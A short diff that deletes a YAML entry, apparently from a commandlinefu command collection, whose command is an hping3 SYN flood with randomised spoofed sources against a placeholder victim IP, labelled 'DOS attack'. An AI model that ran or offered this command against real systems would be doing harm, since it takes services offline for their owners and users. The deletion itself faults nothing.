@@ -1,8 +1,0 @@
-commandlinefu_id: 12212
-translator:
-  weibo: ''
-hide: true
-command: |-
-  hping3 --rand-source -p 80 -S --flood Victim_ip
-summary: |-
-  DOS attack
